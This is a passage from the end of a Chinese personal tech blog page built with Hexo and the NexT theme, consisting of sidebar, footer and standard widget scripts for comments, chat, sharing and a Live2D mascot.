class="nav-text">AIRTUN-NG进行入侵检测</span></a></li></ol></li></ol></div></div><div class="site-overview-wrap sidebar-panel"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="site-author-image" itemprop="image" alt="tosang" src="https://cdn.jsdelivr.net/gh/uestc-toy/blog_file/img/avatar.png"><p class="site-author-name" itemprop="name">tosang</p><div class="site-description" itemprop="description">blog、记录和分享</div></div><div class="site-state-wrap motion-element"><nav class="site-state"><div class="site-state-item site-state-posts"><a href="/archives/"><span class="site-state-item-count">10</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"><a href="/categories/"><span class="site-state-item-count">5</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"><a href="/tags/"><span class="site-state-item-count">8</span> <span class="site-state-item-name">标签</span></a></div></nav></div><div class="sidebar-button motion-element"><a onclick='Chatra("openChat",!0)'><i class="fa fa-comment"></i> Chat</a></div><div class="links-of-author motion-element"><span class="links-of-author-item"><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Vlc3RjLXRveQ==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;uestc-toy"><i class="fab fa-github fa-fw"></i>GitHub</span> </span><span class="links-of-author-item"><span class="exturl" data-url="bWFpbHRvOnRveW9rdXNhbmdAaG90bWFpbC5jb20=" title="E-Mail → mailto:toyokusang@hotmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span></span></div><div class="cc-license motion-element" itemprop="license"><span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span></div></div><div class="back-to-top motion-element"><i class="fa fa-arrow-up"></i> <span>0%</span></div></div></aside><div id="sidebar-dimmer"></div></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; <span itemprop="copyrightYear">2020</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">tosang</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-chart-area"></i> </span><span title="站点总字数">91k</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span title="站点阅读时长">1:23</span></div><div class="powered-by">由 <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl theme-link" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZw==">NexT.Gemini</span> 强力驱动</div></div></footer></div><script src="/lib/anime.min.js"></script><script src="/lib/pjax/pjax.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script><script src="//cdn.jsdelivr.net/npm/lozad@1/dist/lozad.min.js"></script><script src="/lib/velocity/velocity.min.js"></script><script src="/lib/velocity/velocity.ui.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/pisces.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script>var pjax = new Pjax({
  selectors: [
    'head title',
    '#page-configurations',
    '.content-wrap',
    '.post-toc-wrap',
    '.languages',
    '#pjax'
  ],
  switches: {
    '.post-toc-wrap': Pjax.switches.innerHTML
  },
  analytics: false,
  cacheBust: false,
  scrollTo : !CONFIG.bookmark.enable
});

window.addEventListener('pjax:success', () => {
  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
    var code = element.text || element.textContent || element.innerHTML || '';
    var parent = element.parentNode;
    parent.removeChild(element);
    var script = document.createElement('script');
    if (element.id) {
      script.id = element.id;
    }
    if (element.className) {
      script.className = element.className;
    }
    if (element.type) {
      script.type = element.type;
    }
    if (element.src) {
      script.src = element.src;
      // Force synchronous loading of peripheral JS.
      script.async = false;
    }
    if (element.dataset.pjax !== undefined) {
      script.dataset.pjax = '';
    }
    if (code !== '') {
      script.appendChild(document.createTextNode(code));
    }
    parent.appendChild(script);
  });
  NexT.boot.refresh();
  // Define Motion Sequence & Bootstrap Motion.
  if (CONFIG.motion.enable) {
    NexT.motion.integrator
      .init()
      .add(NexT.motion.middleWares.subMenu)
      .add(NexT.motion.middleWares.postList)
      .bootstrap();
  }
  NexT.utils.updateSidebarPosition();
});</script><script data-pjax>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script src="/js/local-search.js"></script><script>!function(a,t,n){t.ChatraID="WeqmpGNhkLxAnnuqz";var c=a.createElement("script");t[n]=t[n]||function(){(t[n].q=t[n].q||[]).push(arguments)},c.async=!1,c.src="https://call.chatra.io/chatra.js",a.head&&a.head.appendChild(c)}(document,window,"Chatra")</script><div id="pjax"><div id="needsharebutton-float"><span class="btn"><i class="fa fa-share-alt" aria-hidden="true"></i></span></div><script src="//cdn.jsdelivr.net/gh/theme-next/theme-next-needmoreshare2@1/needsharebutton.min.js"></script><script>pbOptions={iconStyle:"box",boxForm:"horizontal",position:"bottomCenter",networks:"Weibo,Wechat,Douban,QQZone"},new needShareButton("#needsharebutton-postbottom",pbOptions),flOptions={iconStyle:"box",boxForm:"horizontal",position:"middleRight",networks:"Weibo,Wechat,Douban,QQZone"},new needShareButton("#needsharebutton-float",flOptions)</script><script>NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = '昵称,邮箱,链接';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : true,
      notify     : false,
      appId      : 'cEWy5xlMxSYtWw1jc0vQSgr9-gzGzoHsz',
      appKey     : 'zR4PkPOIJ7DAgbKG7IoJDRS8',
      placeholder: "请发表你的评论",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : true,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : true,
      serverURLs : ''
    });
  }, window.Valine);
});</script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body></html>